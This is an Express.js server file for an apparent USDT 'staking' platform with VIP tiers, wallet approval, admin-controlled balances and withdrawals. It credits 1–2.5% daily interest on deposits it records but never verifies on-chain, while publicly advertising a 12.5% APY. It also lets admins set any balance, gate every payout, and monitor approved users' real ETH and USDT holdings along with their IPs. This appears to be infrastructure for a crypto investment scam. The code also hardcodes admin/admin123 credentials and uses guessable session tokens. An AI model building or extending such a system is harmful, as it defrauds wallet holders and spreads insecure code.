const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const { ethers } = require('ethers');
require('dotenv').config();

const app = express();

// Data persistence file
const DATA_FILE = path.join(__dirname, 'data.json');

// Load data from file
function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
      return data;
    }
  } catch (error) {
    console.error('Error loading data:', error);
  }
  return null;
}

// Save data to file
function saveData() {
  try {
    const data = {
      users,
      walletBalances,
      pendingWallets,
      approvedWallets,
      rejectedWallets,
      pendingWithdrawals,
      transactions,
      platformSettings
    };
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error('Error saving data:', error);
  }
}

// Ethereum provider (using public RPC) - multiple fallback providers
const ETH_RPC_URLS = [
  'https://eth.llamarpc.com',
  'https://rpc.ankr.com/eth',
  'https://ethereum.publicnode.com',
  'https://1rpc.io/eth',
  'https://cloudflare-eth.com'
];

// Create provider with fallback
let provider;
let currentRpcIndex = 0;

function createProvider() {
  provider = new ethers.providers.JsonRpcProvider(ETH_RPC_URLS[currentRpcIndex]);
  console.log(`📡 Using RPC: ${ETH_RPC_URLS[currentRpcIndex]}`);
}

function switchToNextProvider() {
  currentRpcIndex = (currentRpcIndex + 1) % ETH_RPC_URLS.length;
  createProvider();
}

createProvider();

// USDT Contract (Ethereum Mainnet)
const USDT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const USDT_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)'
];
// CORS configuration
app.use(cors({
  origin: process.env.FRONTEND_URL || '*',
  credentials: true
}));
app.use(express.json());
app.use(express.static('public'));

// Admin credentials (use environment variables in production)
const ADMIN_CREDENTIALS = {
  username: 'admin',
  password: 'admin123'
};

// Simple session storage (in production, use proper session management)
let adminSessions = {};

// In-memory storage for users and wallets (starts empty - only real connected wallets)
let users = [];

// Store wallet balances reported by users (from their MetaMask)
let walletBalances = {};

let pendingWallets = [];
let approvedWallets = [];
let rejectedWallets = [];

// Pending withdrawals storage
let pendingWithdrawals = [];

// Transactions storage (starts empty - only real transactions)
let transactions = [];

// VIP Rate Configuration
const VIP_RATES = {
  0: 1,     // Standard: 1% daily
  1: 1.5,   // VIP 1: 1.5% daily
  2: 2,     // VIP 2: 2% daily
  3: 2.5    // VIP 3: 2.5% daily
};

// Platform settings
let platformSettings = {
  baseAPY: 12.5,
  vip1Bonus: 0.25,
  vip2Bonus: 0.5,
  vip3Bonus: 1.0,
  minStake: 100,
  maxStake: 1000000,
  withdrawalFee: 0.5,
  maintenanceMode: false
};

// Load saved data on startup
const savedData = loadData();
if (savedData) {
  users = savedData.users || [];
  walletBalances = savedData.walletBalances || {};
  pendingWallets = savedData.pendingWallets || [];
  approvedWallets = savedData.approvedWallets || [];
  rejectedWallets = savedData.rejectedWallets || [];
  pendingWithdrawals = savedData.pendingWithdrawals || [];
  transactions = savedData.transactions || [];
  platformSettings = { ...platformSettings, ...savedData.platformSettings };
  console.log('📂 Loaded saved data from file');
}

// Generate session token
function generateToken() {
  return Math.random().toString(36).substring(2) + Date.now().toString(36);
}

// Auth middleware
function requireAuth(req, res, next) {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (!token || !adminSessions[token]) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  next();
}

// Calculate VIP level based on staked amount
function calculateVipLevel(stakedAmount) {
  if (stakedAmount >= 100000) return 3;
  if (stakedAmount >= 50000) return 2;
  if (stakedAmount >= 10000) return 1;
  return 0;
}

// ==================== AUTH ROUTES ====================

// Admin login
app.post('/api/admin/login', (req, res) => {
  const { username, password } = req.body;

  if (username === ADMIN_CREDENTIALS.username && password === ADMIN_CREDENTIALS.password) {
    const token = generateToken();
    adminSessions[token] = { username, loginTime: new Date() };
    console.log('✅ Admin logged in');
    res.json({ success: true, token });
  } else {
    console.log('❌ Failed login attempt');
    res.status(401).json({ success: false, error: 'Invalid credentials' });
  }
});

// Admin logout
app.post('/api/admin/logout', (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (token) {
    delete adminSessions[token];
  }
  res.json({ success: true });
});

// Verify token
app.get('/api/admin/verify', (req, res) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  if (token && adminSessions[token]) {
    res.json({ valid: true });
  } else {
    res.status(401).json({ valid: false });
  }
});

// ==================== DASHBOARD STATS ====================

app.get('/api/admin/stats', requireAuth, (req, res) => {
  const totalUsers = users.length;
  const activeUsers = users.filter(u => u.status === 'active').length;
  const totalStaked = users.reduce((sum, u) => sum + u.stakedAmount, 0);
  const totalEarnings = users.reduce((sum, u) => sum + u.totalEarned, 0);
  const pendingApprovals = pendingWallets.filter(w => w.status === 'pending').length;
  const todayTransactions = transactions.filter(t => t.date === new Date().toISOString().split('T')[0]).length;

  res.json({
    totalUsers,
    activeUsers,
    totalStaked,
    totalEarnings,
    pendingApprovals,
    todayTransactions,
    platformAPY: platformSettings.baseAPY
  });
});

// ==================== USER MANAGEMENT ====================

// Get all users
app.get('/api/admin/users', requireAuth, (req, res) => {
  res.json(users);
});

// Get single user
app.get('/api/admin/users/:id', requireAuth, (req, res) => {
  const user = users.find(u => u.id === parseInt(req.params.id));
  if (user) {
    res.json(user);
  } else {
    res.status(404).json({ error: 'User not found' });
  }
});

// Update user
app.put('/api/admin/users/:id', requireAuth, (req, res) => {
  const index = users.findIndex(u => u.id === parseInt(req.params.id));
  if (index !== -1) {
    users[index] = { ...users[index], ...req.body };
    res.json({ success: true, user: users[index] });
  } else {
    res.status(404).json({ error: 'User not found' });
  }
});

// Update user balance
app.post('/api/admin/users/:id/balance', requireAuth, (req, res) => {
  const { stakedAmount, totalEarned } = req.body;
  const index = users.findIndex(u => u.id === parseInt(req.params.id));
  if (index !== -1) {
    if (stakedAmount !== undefined) users[index].stakedAmount = stakedAmount;
    if (totalEarned !== undefined) users[index].totalEarned = totalEarned;

    // Recalculate VIP level
    users[index].vipLevel = calculateVipLevel(users[index].stakedAmount);

    res.json({ success: true, user: users[index] });
  } else {
    res.status(404).json({ error: 'User not found' });
  }
});

// Ban/Unban user
app.post('/api/admin/users/:id/status', requireAuth, (req, res) => {
  const { status } = req.body;
  const index = users.findIndex(u => u.id === parseInt(req.params.id));
  if (index !== -1) {
    users[index].status = status;
    res.json({ success: true, user: users[index] });
  } else {
    res.status(404).json({ error: 'User not found' });
  }
});

// ==================== WALLET APPROVAL ====================

// User requests wallet approval
app.post('/api/request-approval', (req, res) => {
  const { walletAddress, ipAddress, userAgent } = req.body;

  console.log('New wallet approval request:', walletAddress);

  if (approvedWallets.includes(walletAddress.toLowerCase()) || approvedWallets.includes(walletAddress)) {
    return res.json({ success: true, message: 'Already approved', approved: true });
  }

  if (rejectedWallets.includes(walletAddress.toLowerCase()) || rejectedWallets.includes(walletAddress)) {
    return res.json({ success: false, message: 'Wallet was rejected' });
  }

  const existing = pendingWallets.find(w => w.walletAddress.toLowerCase() === walletAddress.toLowerCase());
  if (existing) {
    return res.json({ success: true, message: 'Request already pending' });
  }

  const request = {
    id: Date.now(),
    walletAddress,
    ipAddress: ipAddress || 'Unknown',
    userAgent: userAgent || 'Unknown',
    timestamp: new Date(),
    status: 'pending'
  };

  pendingWallets.push(request);
  saveData();
  res.json({ success: true, message: 'Approval requested' });
});

// Get pending wallets
app.get('/api/admin/pending', requireAuth, (req, res) => {
  const pending = pendingWallets.filter(w => w.status === 'pending');
  res.json(pending);
});

// Get all wallets (with status)
app.get('/api/admin/wallets', requireAuth, (req, res) => {
  res.json({
    pending: pendingWallets.filter(w => w.status === 'pending'),
    approved: approvedWallets,
    rejected: rejectedWallets
  });
});

// Approve wallet
app.post('/api/admin/approve', requireAuth, (req, res) => {
  const { walletAddress } = req.body;

  const wallet = pendingWallets.find(w => w.walletAddress.toLowerCase() === walletAddress.toLowerCase());
  if (wallet) {
    wallet.status = 'approved';
    approvedWallets.push(walletAddress);

    // Create new user
    const newUser = {
      id: users.length + 1,
      walletAddress,
      email: '',
      stakedAmount: 0,
      totalEarned: 0,
      claimableRewards: 0,
      vipLevel: 0,
      status: 'active',
      joinDate: new Date().toISOString().split('T')[0],
      lastActive: new Date().toISOString().split('T')[0]
    };
    users.push(newUser);
    saveData();

    console.log('✅ Wallet approved:', walletAddress);
  }

  res.json({ success: true });
});

// Reject wallet
app.post('/api/admin/reject', requireAuth, (req, res) => {
  const { walletAddress } = req.body;

  const walletIndex = pendingWallets.findIndex(w => w.walletAddress.toLowerCase() === walletAddress.toLowerCase());
  if (walletIndex !== -1) {
    pendingWallets[walletIndex].status = 'rejected';
    rejectedWallets.push(walletAddress);
    saveData();
    console.log('❌ Wallet rejected:', walletAddress);
  }

  res.json({ success: true });
});

// Check if wallet is approved (public endpoint)
app.get('/api/check-approval/:address', (req, res) => {
  const address = req.params.address.toLowerCase();
  const isApproved = approvedWallets.some(w => w.toLowerCase() === address);
  res.json({ approved: isApproved });
});

// ==================== PUBLIC USER ENDPOINTS ====================

// Get user data by wallet address (public - for dashboard)
app.get('/api/user/:walletAddress', (req, res) => {
  const walletAddress = req.params.walletAddress;
  const user = users.find(u => u.walletAddress.toLowerCase() === walletAddress.toLowerCase());

  if (user) {
    res.json({
      stakedAmount: user.stakedAmount,
      totalEarned: user.totalEarned,
      claimableRewards: user.claimableRewards || 0,
      vipLevel: user.vipLevel,
      status: user.status
    });
  } else {
    // Return default data for new users
    res.json({
      stakedAmount: 0,
      totalEarned: 0,
      claimableRewards: 0,
      vipLevel: 0,
      status: 'active'
    });
  }
});

// Get user transactions (public - for dashboard)
app.get('/api/user/:walletAddress/transactions', (req, res) => {
  const walletAddress = req.params.walletAddress;
  const userTransactions = transactions.filter(
    t => t.walletAddress.toLowerCase() === walletAddress.toLowerCase()
  );
  res.json(userTransactions.sort((a, b) => new Date(b.date) - new Date(a.date)));
});

// Get platform settings (public - for dashboard)
app.get('/api/settings', (req, res) => {
  res.json({
    baseAPY: platformSettings.baseAPY,
    vip1Bonus: platformSettings.vip1Bonus,
    vip2Bonus: platformSettings.vip2Bonus,
    vip3Bonus: platformSettings.vip3Bonus,
    minStake: platformSettings.minStake,
    maxStake: platformSettings.maxStake
  });
});

// ==================== STAKING ENDPOINTS ====================

// Stake or unstake USDT
app.post('/api/stake', (req, res) => {
  const { walletAddress, amount, type } = req.body;

  if (!walletAddress || !amount || !type) {
    return res.status(400).json({ success: false, message: 'Missing required fields' });
  }

  const parsedAmount = parseFloat(amount);
  if (isNaN(parsedAmount) || parsedAmount <= 0) {
    return res.status(400).json({ success: false, message: 'Invalid amount' });
  }

  // Check maintenance mode
  if (platformSettings.maintenanceMode) {
    return res.status(503).json({ success: false, message: 'Platform is under maintenance' });
  }

  // Find or create user
  let user = users.find(u => u.walletAddress.toLowerCase() === walletAddress.toLowerCase());

  if (!user) {
    // Create new user if they don't exist
    user = {
      id: users.length + 1,
      walletAddress,
      email: '',
      stakedAmount: 0,
      totalEarned: 0,
      claimableRewards: 0,
      vipLevel: 0,
      status: 'active',
      joinDate: new Date().toISOString().split('T')[0],
      lastActive: new Date().toISOString().split('T')[0]
    };
    users.push(user);
  }

  if (type === 'stake') {
    // Check minimum stake
    if (parsedAmount < platformSettings.minStake) {
      return res.status(400).json({ success: false, message: `Minimum stake is ${platformSettings.minStake} USDT` });
    }

    // Check maximum stake
    if (user.stakedAmount + parsedAmount > platformSettings.maxStake) {
      return res.status(400).json({ success: false, message: `Maximum stake is ${platformSettings.maxStake} USDT` });
    }

    // Update staked amount
    user.stakedAmount += parsedAmount;
    user.vipLevel = calculateVipLevel(user.stakedAmount);
    user.lastActive = new Date().toISOString().split('T')[0];

    // Create transaction
    const newTx = {
      id: transactions.length + 1,
      walletAddress,
      type: 'stake',
      amount: parsedAmount,
      date: new Date().toISOString().split('T')[0],
      status: 'completed'
    };
    transactions.push(newTx);
    saveData();

    console.log(`💰 Stake: ${walletAddress} staked ${parsedAmount} USDT`);
    res.json({ success: true, stakedAmount: user.stakedAmount, transaction: newTx });

  } else if (type === 'unstake') {
    // Check if user has enough staked
    if (parsedAmount > user.stakedAmount) {
      return res.status(400).json({ success: false, message: 'Insufficient staked balance' });
    }

    // Update staked amount
    user.stakedAmount -= parsedAmount;
    user.vipLevel = calculateVipLevel(user.stakedAmount);
    user.lastActive = new Date().toISOString().split('T')[0];

    // Create transaction
    const newTx = {
      id: transactions.length + 1,
      walletAddress,
      type: 'unstake',
      amount: parsedAmount,
      date: new Date().toISOString().split('T')[0],
      status: 'completed'
    };
    transactions.push(newTx);
    saveData();

    console.log(`💸 Unstake: ${walletAddress} unstaked ${parsedAmount} USDT`);
    res.json({ success: true, stakedAmount: user.stakedAmount, transaction: newTx });

  } else {
    return res.status(400).json({ success: false, message: 'Invalid type. Use "stake" or "unstake"' });
  }
});

// Claim rewards
app.post('/api/claim', (req, res) => {
  const { walletAddress } = req.body;

  if (!walletAddress) {
    return res.status(400).json({ success: false, message: 'Wallet address required' });
  }

  // Check maintenance mode
  if (platformSettings.maintenanceMode) {
    return res.status(503).json({ success: false, message: 'Platform is under maintenance' });
  }

  const user = users.find(u => u.walletAddress.toLowerCase() === walletAddress.toLowerCase());

  if (!user) {
    return res.status(404).json({ success: false, message: 'User not found' });
  }

  if (!user.claimableRewards || user.claimableRewards <= 0) {
    return res.status(400).json({ success: false, message: 'No rewards to claim' });
  }

  const claimedAmount = user.claimableRewards;

  // Update user
  user.totalEarned += claimedAmount;
  user.claimableRewards = 0;
  user.lastActive = new Date().toISOString().split('T')[0];

  // Create transaction
  const newTx = {
    id: transactions.length + 1,
    walletAddress,
    type: 'claim',
    amount: claimedAmount,
    date: new Date().toISOString().split('T')[0],
    status: 'completed'
  };
  transactions.push(newTx);
  saveData();

  console.log(`🎁 Claim: ${walletAddress} claimed ${claimedAmount} USDT`);
  res.json({ success: true, amount: claimedAmount, transaction: newTx });
});

// ==================== WITHDRAWAL SYSTEM ====================

// Request withdrawal (user)
app.post('/api/withdraw/request', (req, res) => {
  const { walletAddress, amount } = req.body;

  if (!walletAddress || !amount) {
    return res.status(400).json({ success: false, message: 'Missing required fields' });
  }

  const parsedAmount = parseFloat(amount);
  const user = users.find(u => u.walletAddress.toLowerCase() === walletAddress.toLowerCase());

  if (!user) {
    return res.status(404).json({ success: false, message: 'User not found' });
  }

  if (parsedAmount > user.claimableRewards) {
    return res.status(400).json({ success: false, message: 'Insufficient withdrawable balance' });
  }

  if (parsedAmount <= 0) {
    return res.status(400).json({ success: false, message: 'Invalid amount' });
  }

  // Create pending withdrawal
  const withdrawal = {
    id: pendingWithdrawals.length + 1,
    walletAddress,
    amount: parsedAmount,
    fee: parsedAmount * 0.02,
    netAmount: parsedAmount * 0.98,
    status: 'pending',
    requestedAt: new Date().toISOString(),
    userId: user.id
  };

  pendingWithdrawals.push(withdrawal);

  // Create pending transaction
  const newTx = {
    id: transactions.length + 1,
    walletAddress,
    type: 'withdraw',
    amount: parsedAmount,
    date: new Date().toISOString().split('T')[0],
    status: 'pending'
  };
  transactions.push(newTx);
  saveData();

  console.log(`💸 Withdrawal requested: ${walletAddress} - $${parsedAmount}`);
  res.json({ success: true, withdrawal });
});

// Get pending withdrawals (admin)
app.get('/api/admin/withdrawals/pending', requireAuth, (req, res) => {
  const pending = pendingWithdrawals.filter(w => w.status === 'pending');
  res.json(pending);
});

// Approve withdrawal (admin)
app.post('/api/admin/withdraw/approve', requireAuth, (req, res) => {
  const { withdrawalId } = req.body;

  const withdrawal = pendingWithdrawals.find(w => w.id === withdrawalId);
  if (!withdrawal) {
    return res.status(404).json({ error: 'Withdrawal not found' });
  }

  const user = users.find(u => u.walletAddress.toLowerCase() === withdrawal.walletAddress.toLowerCase());
  if (!user) {
    return res.status(404).json({ error: 'User not found' });
  }

  // Deduct from user's claimable rewards
  user.claimableRewards -= withdrawal.amount;
  withdrawal.status = 'approved';
  withdrawal.approvedAt = new Date().toISOString();

  // Update transaction status
  const tx = transactions.find(t => t.walletAddress.toLowerCase() === withdrawal.walletAddress.toLowerCase() && t.type === 'withdraw' && t.status === 'pending');
  if (tx) tx.status = 'completed';

  saveData();
  console.log(`✅ Withdrawal approved: ${withdrawal.walletAddress} - $${withdrawal.amount}`);
  res.json({ success: true, withdrawal });
});

// Reject withdrawal (admin)
app.post('/api/admin/withdraw/reject', requireAuth, (req, res) => {
  const { withdrawalId, reason } = req.body;

  const withdrawal = pendingWithdrawals.find(w => w.id === withdrawalId);
  if (!withdrawal) {
    return res.status(404).json({ error: 'Withdrawal not found' });
  }

  withdrawal.status = 'rejected';
  withdrawal.rejectedAt = new Date().toISOString();
  withdrawal.rejectionReason = reason || 'Rejected by admin';

  // Update transaction status
  const tx = transactions.find(t => t.walletAddress.toLowerCase() === withdrawal.walletAddress.toLowerCase() && t.type === 'withdraw' && t.status === 'pending');
  if (tx) tx.status = 'rejected';

  saveData();
  console.log(`❌ Withdrawal rejected: ${withdrawal.walletAddress} - $${withdrawal.amount}`);
  res.json({ success: true, withdrawal });
});

// Get user transactions
app.get('/api/user/:walletAddress/transactions', (req, res) => {
  const walletAddress = req.params.walletAddress.toLowerCase();
  const userTx = transactions.filter(t => t.walletAddress.toLowerCase() === walletAddress);
  res.json(userTx);
});

// ==================== INTEREST CALCULATION ====================

// Calculate and add interest to all users (run hourly)
function calculateInterest() {
  users.forEach(user => {
    if (user.stakedAmount > 0 && user.status === 'active') {
      const dailyRate = VIP_RATES[user.vipLevel] || 1;
      const hourlyInterest = (user.stakedAmount * dailyRate / 100) / 24;

      user.claimableRewards = (user.claimableRewards || 0) + hourlyInterest;
      user.totalEarned = (user.totalEarned || 0) + hourlyInterest;
    }
  });
  saveData();
  console.log('💰 Interest calculated for all users');
}

// Run interest calculation every hour
setInterval(calculateInterest, 3600000);

// ==================== ADMIN TRANSACTIONS ====================

app.get('/api/admin/transactions', requireAuth, (req, res) => {
  res.json(transactions);
});

app.post('/api/admin/transactions', requireAuth, (req, res) => {
  const newTx = {
    id: transactions.length + 1,
    ...req.body,
    date: new Date().toISOString().split('T')[0]
  };
  transactions.push(newTx);
  saveData();
  res.json({ success: true, transaction: newTx });
});

// ==================== ADMIN SETTINGS ====================

app.get('/api/admin/settings', requireAuth, (req, res) => {
  res.json(platformSettings);
});

app.put('/api/admin/settings', requireAuth, (req, res) => {
  platformSettings = { ...platformSettings, ...req.body };
  saveData();
  console.log('⚙️ Settings updated:', platformSettings);
  res.json({ success: true, settings: platformSettings });
});

// ==================== ADMIN: Add rewards to user ====================

app.post('/api/admin/users/:id/rewards', requireAuth, (req, res) => {
  const { amount } = req.body;
  const index = users.findIndex(u => u.id === parseInt(req.params.id));

  if (index === -1) {
    return res.status(404).json({ error: 'User not found' });
  }

  const parsedAmount = parseFloat(amount);
  if (isNaN(parsedAmount) || parsedAmount <= 0) {
    return res.status(400).json({ error: 'Invalid amount' });
  }

  users[index].claimableRewards = (users[index].claimableRewards || 0) + parsedAmount;
  saveData();
  console.log(`🎁 Admin added ${parsedAmount} USDT rewards to user ${users[index].walletAddress}`);

  res.json({ success: true, user: users[index] });
});

// ==================== WALLET BALANCE ENDPOINT ====================

// User reports their wallet balance (from MetaMask - reliable source)
app.post('/api/report-balance', (req, res) => {
  const { walletAddress, eth, usdt } = req.body;

  if (!walletAddress) {
    return res.status(400).json({ error: 'Wallet address required' });
  }

  walletBalances[walletAddress.toLowerCase()] = {
    eth: eth || '0.0000',
    usdt: usdt || '0.00',
    timestamp: Date.now()
  };
  saveData();

  console.log(`📊 Balance reported for ${walletAddress.slice(0, 10)}...: ${eth} ETH, ${usdt} USDT`);
  res.json({ success: true });
});

// Balance cache to avoid repeated RPC calls
const balanceCache = new Map();
const CACHE_TTL = 60000; // 1 minute cache

// Helper function with short timeout
async function fetchWithTimeout(promise, timeoutMs = 5000) {
  return Promise.race([
    promise,
    new Promise((_, reject) =>
      setTimeout(() => reject(new Error('Request timeout')), timeoutMs)
    )
  ]);
}

// Get wallet balance - first check user-reported, then try RPC
app.get('/api/wallet-balance/:address', async (req, res) => {
  const address = req.params.address;

  // Validate address
  if (!ethers.utils.isAddress(address)) {
    return res.status(400).json({ error: 'Invalid wallet address' });
  }

  // First check user-reported balance (most reliable - from their MetaMask)
  const reported = walletBalances[address.toLowerCase()];
  if (reported && Date.now() - reported.timestamp < 300000) { // 5 min fresh
    return res.json({
      address,
      eth: reported.eth,
      usdt: reported.usdt,
      source: 'user-reported'
    });
  }

  // Check cache
  const cached = balanceCache.get(address.toLowerCase());
  if (cached && Date.now() - cached.timestamp < CACHE_TTL) {
    return res.json(cached.data);
  }

  // Fall back to user-reported even if older
  if (reported) {
    return res.json({
      address,
      eth: reported.eth,
      usdt: reported.usdt,
      source: 'user-reported-stale'
    });
  }

  // Last resort: try RPC (may timeout)
  let ethFormatted = '0.0000';
  let usdtFormatted = '0.00';

  try {
    const ethBalance = await fetchWithTimeout(provider.getBalance(address));
    ethFormatted = parseFloat(ethers.utils.formatEther(ethBalance)).toFixed(4);

    try {
      const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
      const [usdtBalance, decimals] = await fetchWithTimeout(
        Promise.all([
          usdtContract.balanceOf(address),
          usdtContract.decimals()
        ])
      );
      usdtFormatted = parseFloat(ethers.utils.formatUnits(usdtBalance, decimals)).toFixed(2);
    } catch (usdtError) {
      console.log('USDT fetch error:', usdtError.message);
    }
  } catch (error) {
    console.log('Balance fetch error for', address.slice(0, 10), ':', error.message);
    switchToNextProvider();
  }

  const result = {
    address,
    eth: ethFormatted,
    usdt: usdtFormatted,
    source: 'rpc'
  };

  balanceCache.set(address.toLowerCase(), {
    data: result,
    timestamp: Date.now()
  });

  res.json(result);
});

// Get multiple wallet balances (admin)
app.get('/api/admin/wallet-balances', requireAuth, async (req, res) => {
  const addresses = users.map(u => u.walletAddress);
  const balances = {};

  for (const address of addresses) {
    try {
      if (!ethers.utils.isAddress(address)) {
        balances[address] = { eth: '0.00', usdt: '0.00' };
        continue;
      }

      const ethBalance = await provider.getBalance(address);
      balances[address] = {
        eth: parseFloat(ethers.utils.formatEther(ethBalance)).toFixed(4),
        usdt: '0.00'
      };

      try {
        const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, provider);
        const usdtBalance = await usdtContract.balanceOf(address);
        const decimals = await usdtContract.decimals();
        balances[address].usdt = parseFloat(ethers.utils.formatUnits(usdtBalance, decimals)).toFixed(2);
      } catch (e) {}
    } catch (error) {
      balances[address] = { eth: '0.00', usdt: '0.00' };
    }
  }

  res.json(balances);
});

// ==================== SERVE ADMIN PAGES ====================

// Multiple routes to login for flexibility
app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/admin/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

// Admin dashboard
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`🚀 Backend server running on http://localhost:${PORT}`);
  console.log(`📊 Admin dashboard: http://localhost:${PORT}/admin`);
  console.log(`🔐 Admin login: http://localhost:${PORT}/admin/login`);
  console.log('');
  console.log('Default admin credentials:');
  console.log('  Username: admin');
  console.log('  Password: admin123');
  console.log('');
  console.log('API Endpoints:');
  console.log('  POST /api/stake - Stake/Unstake USDT');
  console.log('  POST /api/claim - Claim rewards');
  console.log('  GET  /api/user/:wallet - Get user data');
  console.log('  GET  /api/settings - Get platform settings');
});
